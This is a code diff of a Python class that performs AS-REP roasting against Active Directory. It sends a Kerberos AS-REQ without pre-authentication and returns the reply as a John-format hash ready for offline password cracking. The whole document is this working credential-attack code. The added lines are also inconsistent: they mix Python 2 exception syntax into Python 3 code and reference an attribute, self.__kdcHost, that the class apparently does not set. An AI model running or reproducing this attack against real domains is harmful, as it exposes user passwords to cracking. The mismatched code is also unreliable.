@@ -33,55 +33,81 @@ class TGT:
     def run(self, save=False) -> {'tgt':any, 'cipher':any, 'oldSessionKey':any, 'newSessonKey':any}:
         """setting save to True will save the tgt to the {username}.ccache"""
 
-
         clientName = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+
         asReq = AS_REQ()
+
         domain = self.domain.upper()
-        serverName = Principal(f'krbtgt/{domain}', type=constants.PrincipalNameType.NT_MS_PRINCIPAL.value)
-        pacR = KERB_PA_PAC_REQUEST()
-        pacR['include-pac'] = True
-        encodePac = encoder.encode(pacR)
+        serverName = Principal('krbtgt/%s' % domain, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+
+        pacRequest = KERB_PA_PAC_REQUEST()
+        pacRequest['include-pac'] = True
+        encodedPacRequest = encoder.encode(pacRequest)
+
         asReq['pvno'] = 5
         asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)
+
         asReq['padata'] = noValue
         asReq['padata'][0] = noValue
         asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
-        asReq['padata'][0]['padata-value'] = encodePac
-        body = seq_set(asReq, 'req-body')
-        opt = []
-        opt.append(constants.KDCOptions.forwardable.value)
-        opt.append(constants.KDCOptions.renewable.value)
-        opt.append(constants.KDCOptions.proxiable.value)
-        body['kdc-options'] = constants.encodeFlags(opt)
-        seq_set(body, 'sname', serverName.components_to_asn1)
-        seq_set(body, 'cname', clientName.components_to_asn1)
-        body['realm'] = domain
+        asReq['padata'][0]['padata-value'] = encodedPacRequest
+
+        reqBody = seq_set(asReq, 'req-body')
+
+        opts = list()
+        opts.append(constants.KDCOptions.forwardable.value)
+        opts.append(constants.KDCOptions.renewable.value)
+        opts.append(constants.KDCOptions.proxiable.value)
+        reqBody['kdc-options'] = constants.encodeFlags(opts)
+
+        seq_set(reqBody, 'sname', serverName.components_to_asn1)
+        seq_set(reqBody, 'cname', clientName.components_to_asn1)
+
+        if domain == '':
+            raise Exception('Empty Domain not allowed in Kerberos')
+
+        reqBody['realm'] = domain
+
         now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
-        body['ti11'] = KerberosTime.to_asn1(now)
-        body['rtime'] = KerberosTime.to_asn1(now)
-        body['nonce'] = random.getrandbits(31)
-        ciphers = (int(constants.EncryptionTypes.rc4_hmac.value),)
-        seq_set_iter(body, 'etype', ciphers)
-        m = encoder.encode(asReq)
+        reqBody['till'] = KerberosTime.to_asn1(now)
+        reqBody['rtime'] = KerberosTime.to_asn1(now)
+        reqBody['nonce'] = random.getrandbits(31)
+
+        supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)
+
+        seq_set_iter(reqBody, 'etype', supportedCiphers)
+
+        message = encoder.encode(asReq)
+
         try:
-            r = sendReceive(m, domain, self.dc_ip)
-        except KerberosError as e:
-            ciphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
-                    int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
-            seq_set_iter(body, 'etype', ciphers)
-            m = encoder.encode(asReq)
-            r = sendReceive(m, domain, self.dc_ip)
-            print(e)
+            r = sendReceive(message, domain, self.__kdcHost)
+        except KerberosError, e:
+            if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
+                # RC4 not available, OK, let's ask for newer types
+                supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
+                                    int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
+                seq_set_iter(reqBody, 'etype', supportedCiphers)
+                message = encoder.encode(asReq)
+                r = sendReceive(message, domain, self.__kdcHost)
+            else:
+                raise e
+
+        # This should be the PREAUTH_FAILED packet or the actual TGT if the target principal has the
+        # 'Do not require Kerberos preauthentication' set
         try:
-            asrep = decoder.decode(r, asn1Spec=KRB_ERROR())[0]
+            asRep = decoder.decode(r, asn1Spec=KRB_ERROR())[0]
         except:
-            asrep = decoder.decode(r, asn1Spec=AS_REP())[0]
-        first = asrep['enc-part']['etype']
-        second = clientName
-        third = domain
-        fourth = hexlify(asrep['enc-part']['cipher'].asOctets()[:16])
-        fifth = hexlify(asrep['enc-part']['cipher'].asOctets()[16:])
-        return f'$krb5asrep${first}${second}@{third}:{fourth}${fifth}'
+            # Most of the times we shouldn't be here, is this a TGT?
+            asRep = decoder.decode(r, asn1Spec=AS_REP())[0]
+        else:
+            # The user doesn't have UF_DONT_REQUIRE_PREAUTH set
+            raise Exception('User %s doesn\'t have UF_DONT_REQUIRE_PREAUTH set' % self.username)
+
+
+        # Let's output the TGT enc-part/cipher in John format, in case somebody wants to use it.
+        return '$krb5asrep$%d$%s@%s:%s$%s' % ( asRep['enc-part']['etype'], clientName, domain,
+                                               hexlify(asRep['enc-part']['cipher'].asOctets()[:16]),
+                                               hexlify(asRep['enc-part']['cipher'].asOctets()[16:]))
 
 
 
